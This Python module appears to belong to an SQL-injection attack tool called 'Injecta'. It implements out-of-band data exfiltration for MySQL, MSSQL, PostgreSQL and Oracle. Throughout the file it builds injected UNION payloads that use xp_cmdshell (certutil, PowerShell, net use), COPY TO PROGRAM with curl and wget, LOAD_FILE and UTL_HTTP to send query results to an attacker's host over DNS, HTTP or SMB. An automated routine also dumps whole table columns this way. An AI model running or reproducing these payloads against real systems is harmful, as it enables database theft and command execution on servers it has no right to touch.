"""
Injecta — Out-of-band (DNS/HTTP/SMB) data exfiltration
"""
import re
import time
from typing import Any, Dict, List, Optional


OOB_CHANNELS = {
    "dns": {"ports": [53], "protocol": "udp"},
    "http": {"ports": [80, 443, 8080], "protocol": "tcp"},
    "smb": {"ports": [445, 139], "protocol": "tcp"},
}


class OOBExfiltrator:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "unknown") if payloads else "unknown"

    def exfiltrate(self, url: str, param: str, data_query: str, target_host: str,
                   channel: str = "dns", table: str = "") -> Dict[str, Any]:
        self.log.info(f"OOB exfiltration via {channel.upper()} to {target_host}")
        result = {"channel": channel, "target": target_host, "success": False, "technique": None, "error": None}

        techniques = self._get_oob_techniques(channel, data_query, target_host, table)
        for tech_name, queries in techniques.items():
            for q in queries:
                payload = f"' UNION {q}-- -"
                try:
                    _, resp_text, _ = self.req.test_raw(url, payload, param)
                    if resp_text:
                        result["success"] = True
                        result["technique"] = tech_name
                        self.log.ok(f"OOB payload sent via {tech_name}")
                        return result
                except Exception as e:
                    self.log.debug2(f"OOB {tech_name} failed: {e}")

        result["error"] = "All OOB techniques failed"
        self.log.warn("No OOB channel succeeded")
        return result

    def _get_oob_techniques(self, channel: str, data_query: str, host: str, table: str = "") -> Dict[str, List[str]]:
        methods = {}

        if self.dbms == "mysql":
            if channel == "dns":
                methods["dns_load_file"] = [
                    f"SELECT LOAD_FILE(CONCAT(0x5c5c5c5c, '{host}', 0x5c5c, ({data_query}), 0x2e64617461))",
                ]
            elif channel == "http":
                methods["http_into_outfile"] = [
                    f"SELECT ({data_query}) INTO OUTFILE CONCAT(0x5c5c5c5c, '{host}', 0x5c5c, 0x73686172655c6f75742e747874)",
                ]
            methods["oob_all"] = [
                f"SELECT ({data_query}) INTO DUMPFILE '/tmp/injecta_oob.dat'",
            ]

        elif self.dbms == "mssql":
            if channel == "dns":
                methods["dns_xp_cmdshell"] = [
                    f"EXEC master..xp_cmdshell 'nslookup {host}'",
                ]
            elif channel == "http":
                methods["http_xp_cmdshell"] = [
                    f"EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://{host}/oob'",
                    f"EXEC master..xp_cmdshell 'powershell Invoke-WebRequest -Uri http://{host}/oob'",
                ]
            methods["oob_smb"] = [
                f"EXEC master..xp_cmdshell 'net use \\\\{host}\\share'",
            ]

        elif self.dbms == "postgresql":
            if channel == "dns":
                methods["dns_copy"] = [
                    f"COPY (SELECT ({data_query})) TO PROGRAM 'nslookup {host}'",
                ]
            elif channel == "http":
                methods["http_copy"] = [
                    f"COPY (SELECT ({data_query})) TO PROGRAM 'curl http://{host}/?d=$(cat)'",
                    f"COPY (SELECT ({data_query})) TO PROGRAM 'wget --post-data=$(cat) http://{host}/'",
                ]

        elif self.dbms == "oracle":
            if channel == "dns":
                methods["dns_utl_http"] = [
                    f"SELECT UTL_HTTP.REQUEST('http://{host}/' || ({data_query})) FROM DUAL",
                ]
            elif channel == "http":
                methods["http_utl_http"] = [
                    f"SELECT UTL_HTTP.REQUEST('http://{host}/exfil?d=' || ({data_query})) FROM DUAL",
                ]

        return methods

    def dns_exfiltrate(self, url: str, param: str, query: str, domain: str) -> Dict[str, Any]:
        return self.exfiltrate(url, param, query, domain, channel="dns")

    def http_exfiltrate(self, url: str, param: str, query: str, callback_url: str) -> Dict[str, Any]:
        host = re.sub(r"https?://", "", callback_url).split("/")[0]
        return self.exfiltrate(url, param, query, host, channel="http")

    def automated_exfil(self, url: str, param: str, db: str, table: str, column: str,
                        target_host: str) -> Dict[str, Any]:
        self.log.info(f"Automated OOB exfil of {db}.{table}.{column} to {target_host}")
        results = {}

        for channel in ["dns", "http"]:
            data_query = f"SELECT {column} FROM {table}"
            r = self.exfiltrate(url, param, data_query, target_host, channel, table)
            results[channel] = r
            if r["success"]:
                break

        return {"results": results, "overall_success": any(r["success"] for r in results.values())}
